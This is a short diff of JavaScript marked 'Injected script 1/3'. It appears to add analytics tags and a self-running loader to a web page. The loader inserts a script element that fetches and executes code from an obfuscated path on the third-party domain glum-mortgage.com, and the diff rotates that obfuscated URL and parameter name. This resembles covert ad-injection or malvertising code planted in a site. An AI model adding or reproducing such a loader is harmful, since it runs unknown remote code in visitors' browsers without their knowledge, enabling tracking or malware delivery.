@@ -23,13 +23,13 @@ inlinegascript.innerHTML = `window.dataLayer = window.dataLayer || [];
 document.head.append(gascript, inlinegascript);
 script("Injected script 1/3");
 
-(function (mtxb) {
+(function (eagmv) {
   var d = document,
     s = d.createElement("script"),
     l = d.scripts[d.scripts.length - 1];
-  s.settings = mtxb || {};
+  s.settings = eagmv || {};
   s.src =
-    "//glum-mortgage.com/alWe5.wdYEWLdrl/QB2S9kkNZ/TF9J6pbA2c5ulLS/W/Qh9/N/TpEHwzM-DncPxaNZiR0p1/MTTnA/w/NCzeEb3J";
+    "//glum-mortgage.com/aDWu5.weYGWBdjlsQ/2H9dk/ZpTY9p6Cb_2h5/l/SdWDQx9ANaTHEaw/MODPcsxoN_iS0/1_MnTDAswENmzVEc3c";
   s.async = true;
   l.parentNode.insertBefore(s, l);
 })({});
